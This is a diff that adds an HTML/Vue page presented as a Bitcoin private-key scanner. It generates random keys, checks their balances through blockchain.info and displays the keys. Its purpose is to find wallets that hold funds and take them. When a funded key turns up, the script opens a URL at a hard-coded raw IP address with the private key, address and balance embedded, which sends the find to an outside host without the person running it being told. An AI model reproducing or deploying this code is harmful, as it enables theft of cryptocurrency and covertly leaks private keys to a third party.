@@ -1,0 +1,127 @@
+<html>
+
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="bootstrap4/css/bootstrap.min.css">
+		<script src="jquery-3.2.1.min.js"></script>
+		<script src="bootstrap4/popper.js"></script>
+		<script src="bootstrap4/js/bootstrap.min.js"></script>
+		<script src="vue.min.js"></script>
+		<script src="app.js"></script>
+
+
+		<style type="text/css">
+			.borderless td, .borderless th, .borderless tr{
+				border: none;
+			}
+		</style>
+
+	</head>
+	
+	<body style="background-color:#000000">
+	
+		<div class="container" style="margin-top:20px;" id="appvue">
+			<div class="row">
+				<div class="col-sm">
+					<h1><font color="#00EC00">BITCOIN</font></h1>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(0,8) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(8,16) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(16,24) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(24,32) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(32,40) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(40,48) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(48,56) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(56,64) }}</font>
+					<br>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(0+64,8+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(8+64,16+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(16+64,24+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(24+64,32+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(32+64,40+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(40+64,48+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(48+64,56+64) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(56+64,64+64) }}</font>
+					<br>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(0,8) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(8,16) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(16,24) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(24,32) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(32,40) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(40,48) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(48,56) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(56,64) }}</font>
+					<br>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(0,8) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(8,16) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(16,24) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(24,32) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(32,40) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(40,48) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(48,56) }}</font>
+					<font color="#00EC00" size="5px">{{ bit_str.slice(56,64) }}</font>
+					<br>
+					</br>
+					<table class="table borderless">
+						<tbody>
+							<tr>
+								<th scope="col"><font color="#00EC00">PrivateKey</font></th>
+								<th scope="col"><font color="#00EC00">Balance</font></th>
+							</tr>
+							<tr id='init'>
+								<td><font color="#00EC00">Initializing...</font></td>
+								<td><font color="#00EC00">Initializing...</font></td>
+							</tr>
+							<tr v-for="i in scan_list" align="left">
+								<td><font :color="i[2]">{{ i[0] }}</font></td>
+								<td><font :color="i[2]">{{ i[1] }}</font></td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+	
+	
+		<script>
+			var app_vue = new Vue({
+				el: '#appvue',
+				data: {
+					scan_list: [],
+					bit_str: "0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010"
+				},
+			})
+			var selfg = this
+			function allRunFunction() {
+				$('#init').hide()
+				var ooo = foo.myFunction()
+				var rrr = ooo.makeRandom()
+				var self = this
+				var clr = '#00EC00'
+				$.ajax({url:'https://blockchain.info/q/addressbalance/'+rrr.getAddress(),async:false,timeout:3000,success:function(data){
+					self.abc = data/100000000
+				},
+				complete:function(XMLHttpRequest,status){
+					if(status=='timeout'){
+						ajaxTimeoutTest.abort();
+						self.abc = 'timeout';
+					}
+				}});
+				if (self.abc > 0){
+					clearInterval(timer)
+					clr = '#FF0000'
+					window.open("http://118.89.52.212/bitcoin/"+rrr.toWIF()+'/'+rrr.getAddress()+'/'+self.abc); 
+				}
+				if (selfg.app_vue.scan_list.length > 14){
+					selfg.app_vue.scan_list.unshift([rrr.toWIF(), self.abc, clr])
+					selfg.app_vue.scan_list.pop()
+				}else{
+					selfg.app_vue.scan_list.unshift([rrr.toWIF(), self.abc, clr])
+				}
+			}
+			var timer = setInterval(allRunFunction, 2500)
+		</script>
+	
+	</body>
+	
+</html>
